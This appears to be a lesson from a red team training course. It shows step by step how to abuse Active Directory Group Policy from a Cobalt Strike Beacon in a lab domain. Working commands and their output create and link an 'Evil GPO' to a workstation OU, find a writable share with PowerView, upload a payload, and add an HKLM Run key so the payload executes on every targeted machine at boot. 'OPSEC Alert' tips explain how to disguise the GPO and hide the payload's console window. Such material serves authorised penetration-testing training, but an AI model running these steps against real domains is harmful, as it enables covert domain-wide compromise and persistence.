RSAT is a management component provided by Microsoft to help manage components in a domain. Since it's a legitimate management tool and often found on management workstations and servers, it can be useful to leverage without having to bring in external tooling.

The GroupPolicy module has several PowerShell cmdlets that can be used for administering GPOs, including:

-   New-GPO: Create a new, empty GPO.
-   New-GPLink: Link a GPO to a site, domain or OU.
-   Set-GPPrefRegistryValue: Configures a Registry preference item under either Computer or User Configuration.
-   Set-GPRegistryValue: Configures one or more registry-based policy settings under either Computer or User Configuration.
-   Get-GPOReport: Generates a report in either XML or HTML format.

You can check to see if the GroupPolicy module is installed with `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. In a pinch, you can install it with `Install-WindowsFeature –Name GPMC` as a local admin.

Create a new GPO and immediately link it to the target OU.

```
beacon> getuid
[*] You are DEV\jking

beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

GpoId       : d9de5634-cc47-45b5-ae52-e7370e4a4d22
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 4
```

  

 > **OPSEC Alert**  
The GPO will be visible in the Group Policy Management Console and other RSAT GPO tools, so make sure the name is "convincing".

Being able to write anything, anywhere into the HKLM or HKCU hives presents different options for achieving code execution. One simple way is to create a new autorun value to execute a Beacon payload on boot.

```
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 281kb    fil     03/10/2021 13:54:10   pivot.exe
```

  

>  You can find this writeable software share with PowerView:  
```
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```

  

```
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString

DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\jking
Id               : d9de5634-cc47-45b5-ae52-e7370e4a4d22
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 5/26/2021 2:35:02 PM
ModificationTime : 5/26/2021 2:42:08 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        : 
```

Every machine will typically refresh their GPOs automatically every couple of hours. To do it manually, use the Lab Dashboard to access the WKSTN-2 Console and execute `gpupdate /target:computer /force` in a Command Prompt. Use `regedit` to verify the new registry value has been applied and then reboot WKSTN-2. When it starts up again, reconnect to the console and the payload will execute.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/group-policy/pivot.png)

  

>  **OPSEC Alert**  
You will also notice that this leaves a Command Prompt on the screen!  A better way to do it could be `%COMSPEC% /b /c start /b /min`.